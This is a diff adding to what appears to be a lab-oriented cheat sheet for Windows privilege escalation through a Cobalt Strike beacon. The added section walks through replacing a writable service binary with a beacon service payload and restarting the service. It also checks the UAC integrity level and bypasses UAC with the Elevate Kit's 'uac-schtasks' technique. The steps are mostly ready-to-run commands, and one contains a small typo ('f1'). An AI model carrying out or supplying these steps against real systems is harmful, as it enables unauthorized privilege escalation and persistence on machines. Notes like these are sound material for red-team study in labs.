@@ -75,4 +75,24 @@ run sc start VulnService2
 
 **Weak Service Binary Permissions**
 
+This time the binary itself is able to be overwritten, checking for it's permissions. Make sure to download to keep as backup just in case. Also turn off the service before doing this, otherwise you will get helpmessage 32
+```
+powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | f1
+download Service 3.exe
+copy "tcp-local_x64.svc.exe" "Service 3.exe"
+run sc stop VulnService3
+upload C:\Payload\Service 3.exe
+run sc start VulnService3
+```
+
 **UAC Bypasses**
+
+Check for UAC, *medium mandatory* means UAC in this case
+```
+whoami /groups
+```
+
+beacon can get around this by using the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) which you should load into your Cobalt Strike for use
+```
+elevate uac-schtasks tcp-local
+```
